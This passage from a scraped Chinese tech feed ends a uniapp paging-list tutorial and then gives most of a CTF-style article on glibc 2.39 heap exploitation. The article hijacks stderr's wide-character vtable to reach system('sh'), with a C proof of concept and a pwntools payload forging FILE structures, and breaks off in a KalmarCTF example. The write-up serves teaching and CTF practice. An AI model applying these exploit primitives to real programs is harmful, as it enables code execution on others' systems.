<span class="hljs-keyword">const</span> paging = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>);
<span class="hljs-keyword">const</span> dataList = <span class="hljs-title function_">ref</span>([]);

<span class="hljs-keyword">const</span> resourceClass = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);

<span class="hljs-keyword">const</span> option1 = <span class="hljs-title function_">ref</span>([
  { <span class="hljs-attr">text</span>: <span class="hljs-string">'全部记录'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">''</span> },
  { <span class="hljs-attr">text</span>: <span class="hljs-string">'文旅景区'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'scenic'</span> },
  { <span class="hljs-attr">text</span>: <span class="hljs-string">'体育赛事'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'event'</span> },
]);

<span class="hljs-comment">// @query所绑定的方法不要自己调用！！需要刷新列表数据时，只需要调用paging.value.reload()即可</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">queryList</span> = (<span class="hljs-params">pageNo, pageSize</span>) =&gt; {
  <span class="hljs-comment">// 组件加载时会自动触发此方法，因此默认页面加载时会自动触发，无需手动调用</span>
  <span class="hljs-comment">// 这里的pageNo和pageSize会自动计算好，直接传给服务器即可</span>
  <span class="hljs-keyword">const</span> params = {
    <span class="hljs-attr">originType</span>: resourceClass.<span class="hljs-property">value</span>,
    <span class="hljs-attr">pageNum</span>: pageNo,
    pageSize,
  };
  <span class="hljs-keyword">const</span> token = uni.<span class="hljs-title function_">getStorageSync</span>(<span class="hljs-string">'token'</span>);
  <span class="hljs-keyword">if</span> (token) {
    <span class="hljs-title function_">queryDownload</span>(params, token)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
        <span class="hljs-comment">// 将请求的结果数组传递给z-paging</span>
        paging.<span class="hljs-property">value</span>.<span class="hljs-title function_">complete</span>(res.<span class="hljs-property">rows</span>);
      })
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
        <span class="hljs-comment">// 如果请求失败写paging.value.complete(false);</span>
        <span class="hljs-comment">// 注意，每次都需要在catch中写这句话很麻烦，z-paging提供了方案可以全局统一处理</span>
        <span class="hljs-comment">// 在底层的网络请求抛出异常时，写uni.$emit('z-paging-error-emit');即可</span>
        paging.<span class="hljs-property">value</span>.<span class="hljs-title function_">complete</span>(<span class="hljs-literal">false</span>);
      });
  }
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">selectClass</span>(<span class="hljs-params">event</span>) {
  resourceClass.<span class="hljs-property">value</span> = event.<span class="hljs-property">detail</span>;
  paging.<span class="hljs-property">value</span>.<span class="hljs-title function_">reload</span>(); <span class="hljs-comment">// 刷新分页</span>
}

<span class="hljs-comment">// 前往下载列表</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">toDownloadList</span>(<span class="hljs-params">item</span>) {
  uni.<span class="hljs-title function_">navigateTo</span>({
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/pages/downloadList/index'</span>,
    <span class="hljs-attr">success</span>: <span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
      res.<span class="hljs-property">eventChannel</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'recordFolder'</span>, item);
    },
  });
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"scss"</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.downloadHistory</span> {
  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f5f5f5</span>;
}

<span class="hljs-selector-class">.downloadCollection</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">30</span>rpx;
  <span class="hljs-attribute">padding-top</span>: <span class="hljs-number">130</span>rpx;
}

<span class="hljs-selector-class">.downloadCard</span> {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8</span>rpx;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">30</span>rpx;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: flex-start;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">30</span>rpx;
  &amp;<span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">1</span>) {
    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30</span>rpx;
  }
}

<span class="hljs-selector-class">.downloadCard</span><span class="hljs-selector-pseudo">:last-child</span> {
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">0</span>;
}

<span class="hljs-selector-class">.picInfo</span> {
  <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">20</span>rpx;
}

<span class="hljs-selector-class">.picTitle</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">30</span>rpx;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">50</span>rpx;
}

<span class="hljs-selector-class">.picNum</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">28</span>rpx;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>;
}

<span class="hljs-selector-class">.mr-20</span> {
  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">20</span>rpx;
}

<span class="hljs-selector-class">.loading-status</span> {
  <span class="hljs-attribute">text-align</span>: center;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">40</span>rpx <span class="hljs-number">0</span>;
}
<span class="hljs-selector-class">.no-more</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">24</span>rpx;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#999</span>;
  <span class="hljs-attribute">text-align</span>: center;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">40</span>rpx;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

</code></pre>
<p>参考文档</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Funiapp.dcloud.net.cn%2Fcomponent%2Fscroll-view.html%23scroll-view" target="_blank" title="https://uniapp.dcloud.net.cn/component/scroll-view.html#scroll-view" ref="nofollow noopener noreferrer">uniapp.dcloud.net.cn/component/s…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fz-paging.zxlee.cn%2F" target="_blank" title="https://z-paging.zxlee.cn/" ref="nofollow noopener noreferrer">z-paging.zxlee.cn/</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[浅谈glibc2.39下的堆利用]]></title>    <link>https://juejin.cn/post/7576929700842864649</link>    <guid>https://juejin.cn/post/7576929700842864649</guid>    <pubDate>2025-11-27T07:44:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576929700842864649" data-draft-id="7577189654488383538" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="浅谈glibc2.39下的堆利用"/> <meta itemprop="keywords" content="黑客"/> <meta itemprop="datePublished" content="2025-11-27T07:44:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="蚁景网安实验室"/> <meta itemprop="url" content="https://juejin.cn/user/1398234521018846"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            浅谈glibc2.39下的堆利用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1398234521018846/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    蚁景网安实验室
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:44:23.000Z" title="Thu Nov 27 2025 07:44:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在<code>glibc2.34</code>以后取消了<code>__free_hook</code>以及<code>__malloc_hook</code>，因此需要找到一个可以控制程序执行流程的函数指针代替<code>__free_hook</code>以及<code>__malloc_hook</code>。</p>
<pre><code class="hljs language-ini" lang="ini">struct _IO_FILE_plus
{
    _IO_FILE    file<span class="hljs-comment">;</span>
    IO_jump_t   *vtable<span class="hljs-comment">;</span>
}
</code></pre>
<p>在结构体<code>_IO_FILE_plus</code>中存在着类似于虚表的变量<code>vtable</code>，其中存储着许多函数指针。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c12924f67be47cf9e46c1a215d50504~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834263&amp;x-signature=FmRNQewyHCJBmOx0xuRVWlozfvM%3D" alt="image-20251009194102943" loading="lazy"/></p>
<p>若能修改<code>vtable</code>指针并指向我们伪造的<code>vtable</code>，即可达成劫持程序执行流程的目的。</p>
<p>但是在<code>glibc2.24</code>之后加入了<code>vtable</code>指针的校验，简单来说就是会检测<code>vtable</code>指针是否在范围之内。因此在<code>glibc2.24</code>之后，需要找在范围内的<code>vtable</code>指针加以利用。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *
<span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span>
{
  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<span class="hljs-comment">//计算在glibc中vtable指针的范围</span>
  <span class="hljs-type">uintptr_t</span> ptr = (<span class="hljs-type">uintptr_t</span>) vtable;
  <span class="hljs-type">uintptr_t</span> offset = ptr - (<span class="hljs-type">uintptr_t</span>) __start___libc_IO_vtables; <span class="hljs-comment">//判断当前vtable指针与起始位置的偏移</span>
  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="hljs-comment">//若偏移大于最大距离则校验失败</span>
    _IO_vtable_check ();
  <span class="hljs-keyword">return</span> vtable;
}
</code></pre>
<p>在<code>glibc</code>范围内存在着名为<code>_IO_wfile_jumps</code>的<code>vtable</code>指针。该跳转表中存在着一个特殊的函数<code>_IO_wfile_overflow</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4764f6fff25449c1843d4603048c9663~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834263&amp;x-signature=TdFT3hkDGLjGUvW1g5yrJEvHkWA%3D" alt="image-20251009195029742" loading="lazy"/></p>
<p>调用流程如下所示，简单来讲<code>_IO_wfile_overflow</code>最终调用的是<code>_IO_wdoallocbuf</code>将宏拆解，实际最终调用的是<code>fp-&gt;_wide_data-&gt;_wide_vtable</code>，而在调用<code>fp-&gt;_wide_data-&gt;_wide_vtable</code>的时候并没有检测<code>vtable</code>的合法性，因此倘若我们能够伪造<code>__wide_data</code>就能够控制<code>_wide_vtable</code>变量，最后将该跳转表内容修改为<code>system</code>，即可完成程序流程的劫持。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">/*
_IO_wfile_overflow
	=&gt; _IO_wdoallocbuf
		=&gt; _IO_WDOALLOCATE
*/</span>

wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  <span class="hljs-comment">//#define _IO_NO_WRITES         0x0008</span>
  <span class="hljs-comment">//f-&gt;_flags &amp; _IO_NO_WRITES == 0</span>
  if (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="hljs-comment">/* SET ERROR */</span>
    {
      f-&gt;_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  <span class="hljs-comment">//#define _IO_CURRENTLY_PUTTING 0x0800</span>
  <span class="hljs-comment">//f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</span>
  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span>)
    {
      <span class="hljs-comment">//f-&gt;_wide_data-&gt;_IO_write_base == 0</span>
      if (f-&gt;_wide_data-&gt;_IO_write_base == <span class="hljs-number">0</span>)
	{
      <span class="hljs-comment">//满足上述条件执行fp-&gt;_wide_data-&gt;_wide_vtable</span>
	  _IO_wdoallocbuf (f);
	  ...

void
_IO_wdoallocbuf (FILE *fp)
{
  <span class="hljs-comment">//fp-&gt;_wide_data-&gt;_IO_buf_base == 0</span>
  if (fp-&gt;_wide_data-&gt;_IO_buf_base)
    return;
  <span class="hljs-comment">//#define _IO_UNBUFFERED        0x0002</span>
  <span class="hljs-comment">//fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</span>
  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  ...

<span class="hljs-selector-id">#define</span> <span class="hljs-built_in">_IO_WDOALLOCATE</span>(FP) WJUMP0 (__doallocate, FP)
<span class="hljs-selector-id">#define</span> <span class="hljs-built_in">WJUMP0</span>(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)
<span class="hljs-selector-id">#define</span> <span class="hljs-built_in">_IO_WIDE_JUMPS_FUNC</span>(THIS) <span class="hljs-built_in">_IO_WIDE_JUMPS</span>(THIS)
<span class="hljs-selector-id">#define</span> <span class="hljs-built_in">_IO_WIDE_JUMPS</span>(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable
</code></pre>
<p>根据上述源码我们可以知道，想要执行<code>_IO_wdoallocbuf</code>需要满足以下几个条件</p>
<ul>
<li>
<p><code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code></p>
</li>
<li>
<p><code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</code></p>
</li>
<li>
<p><code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p>
</li>
<li>
<p><code>fp-&gt;_wide_data-&gt;_IO_buf_base == 0</code></p>
</li>
<li>
<p><code>fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code></p>
</li>
</ul>
<p>想要让程序执行<code>_IO_wfile_overflow</code>函数需要触发以下调用链</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6810bd513263401e98bdacc89ec1455f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834263&amp;x-signature=6VE165rNv6nTi5ZpqmwNxNU9eOc%3D" alt="image-20251009221543800" loading="lazy"/></p>
<p><code>_IO_cleanup</code>函数的作用是清理所有打开的标准<code>I/O</code>流，因此在程序退出时就会调用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bddb096fb81c4da69ec2718826bd2a7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834263&amp;x-signature=TFs0v1EF6x4KaPxC9%2FsX1jW415g%3D" alt="image-20251009221812005" loading="lazy"/></p>
<p><code>_IO_cleanup</code>函数调用如下所示，实际内部执行的函数为<code>_IO_flush_all</code></p>
<pre><code class="hljs language-rust" lang="rust">int
_IO_cleanup (void)
{
    ...
  int result = _IO_flush_all ();
    ...
}

int
_IO_flush_all (void)
{
    ...
  <span class="hljs-title function_ invoke__">for</span> (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp<span class="hljs-punctuation">-&gt;</span>_chain)
    {
      ...
      <span class="hljs-title function_ invoke__">if</span> (((fp<span class="hljs-punctuation">-&gt;</span>_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp<span class="hljs-punctuation">-&gt;</span>_IO_write_ptr &gt; fp<span class="hljs-punctuation">-&gt;</span>_IO_write_base)
	   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span>
	       &amp;&amp; fp<span class="hljs-punctuation">-&gt;</span>_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp<span class="hljs-punctuation">-&gt;</span>_wide_data<span class="hljs-punctuation">-&gt;</span>_IO_write_ptr
				    &gt; fp<span class="hljs-punctuation">-&gt;</span>_wide_data<span class="hljs-punctuation">-&gt;</span>_IO_write_base))
	   )
	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
          ...
}
</code></pre>
<p><code>_IO_list_all</code>执行的列表顺序为<code>stderr-&gt;stdout-&gt;stdin</code>，因此我们可以通过修改<code>stderr-&gt;_wide_data</code>与<code>stderr-&gt;vtable</code>就可以优先触发利用链，但是依旧需要满足以下限制条件：</p>
<ul>
<li>
<p><code>fp-&gt;_mode == 0</code></p>
</li>
<li>
<p><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></p>
</li>
</ul>
<h2 data-id="heading-0">POC</h2>
<p>根据上述条件，总结<code>POC</code>如下</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> {</span>
    <span class="hljs-type">void</span> *funcs[<span class="hljs-number">27</span>]; <span class="hljs-comment">// 伪占位，不同glibc版本可能不同</span>
};
<span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> {</span>
    FILE file;
    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span>
};
<span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stderr_</span>;</span>
<span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_wfile_jumps</span>;</span>
<span class="hljs-type">long</span>  *fake_IO_wide_data;
<span class="hljs-type">long</span> *fake_wide_vtable;
<span class="hljs-type">long</span> * p;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">//_IO_wide_data结构大小为0xe8</span>
    fake_IO_wide_data = (<span class="hljs-type">long</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xe8</span>);
    <span class="hljs-comment">//跳转表结构大小为0xe8</span>
    fake_wide_vtable = (<span class="hljs-type">long</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa8</span>);
    <span class="hljs-comment">//glibc2.39:_IO_wfile_jumps = _IO_file_jumps + 0x1f8</span>
    _IO_2_1_stderr_.vtable = (<span class="hljs-type">char</span> *)_IO_2_1_stderr_.vtable + <span class="hljs-number">0x1f8</span>;
    <span class="hljs-built_in">stderr</span>-&gt;_wide_data = fake_IO_wide_data;
    <span class="hljs-built_in">stderr</span>-&gt;_IO_write_ptr = <span class="hljs-number">1</span>;
    <span class="hljs-built_in">stderr</span>-&gt;_IO_write_base = <span class="hljs-number">0</span>;
    *(<span class="hljs-type">long</span> **)((<span class="hljs-type">char</span> *)fake_IO_wide_data + <span class="hljs-number">0xe0</span>) = fake_wide_vtable;
    *(<span class="hljs-type">long</span> **)((<span class="hljs-type">char</span> *)fake_wide_vtable + <span class="hljs-number">0x68</span>) = (<span class="hljs-type">long</span> *)system;
    <span class="hljs-comment">//0xfbad为魔数,0x0101是为了拼接后续的sh字符串</span>
    <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">char</span> *)&amp;<span class="hljs-built_in">stderr</span>-&gt;_flags,<span class="hljs-string">"\x01\x01\xad\xfb;sh"</span>,<span class="hljs-number">8</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><code>python</code>脚本</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment">#fake_wide_vtable(0xa8)</span>
<span class="hljs-attr">payload</span>  = b<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x68 + p64(libcbase + libc.symbols[<span class="hljs-string">'system'</span>])
<span class="hljs-attr">payload</span> = payload.ljust(<span class="hljs-number">0</span>xa8,b<span class="hljs-string">"\x00"</span>)
add(26,0xa8,payload)
<span class="hljs-attr">fake_wide_vtable</span> = heapbase + <span class="hljs-number">0</span>x1770

<span class="hljs-comment">#fake_IO_wide_data(0xe8)</span>
<span class="hljs-attr">payload</span> = b<span class="hljs-string">'\x00'</span> * <span class="hljs-number">0</span>xe0 + p64(fake_wide_vtable)
add(25,0xe8,payload)
<span class="hljs-attr">fake_IO_wide_data</span>  = heapbase + <span class="hljs-number">0</span>x1670

<span class="hljs-comment">#fake stderr(0xe0)</span>
<span class="hljs-attr">fake_stderr</span>                = FileStructure(<span class="hljs-number">0</span>)
<span class="hljs-attr">fake_stderr.flags</span>          = u64(b<span class="hljs-string">'  sh\x00\x00\x00\x00'</span>)
<span class="hljs-attr">fake_stderr._IO_write_base</span> = <span class="hljs-number">0</span>
<span class="hljs-attr">fake_stderr._IO_write_ptr</span>  = <span class="hljs-number">1</span> <span class="hljs-comment"># _IO_write_ptr &gt; _IO_write_base</span>
<span class="hljs-attr">fake_stderr._wide_data</span>     = fake_IO_wide_data
<span class="hljs-attr">fake_stderr.vtable</span>         = libc.symbols[<span class="hljs-string">'_IO_wfile_jumps'</span>] + libcbase
<span class="hljs-attr">fake_stderr._lock</span>          = <span class="hljs-number">0</span>x205700 + libcbase <span class="hljs-comment">#_IO_stdfile_2_lock</span>
<span class="hljs-attr">fake_stderr_bytes</span> = bytes(fake_stderr)
</code></pre>
<h2 data-id="heading-1">例题</h2>
<h3 data-id="heading-2">KalmarCTF 2025-Merger</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a0e2eafd01b4b96bec5b07f5d2e23ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834263&amp;x-signature=H94Wc1TEyG2XVyfXdAAeIldOzkk%3D" alt="image-20251016101218782" loading="lazy"/></p>
<p>在<code>merge</code>功能中堆块是通过<code>realloc</code>函数对<code>src</code>与<code>dst</code>堆块进行合并，合并完成之后，使用<code>free</code>函数对<code>src</code>堆块进行释放。但是这里存在一个漏洞点，没有限制<code>src</code>与<code>dst</code>堆块的下标，使得<code>src</code>与<code>dst</code>堆块的下标可以设置为同一个值。</p>
<p><code>realloc</code>函数在重新分配堆块时会出现以下情况：</p>
<ol>
<li>
<p>当重新申请的堆块的<code>size</code>小于当前堆块的<code>size</code>，则<code>realloc</code>会分割当前堆块</p>
</li>
<li>
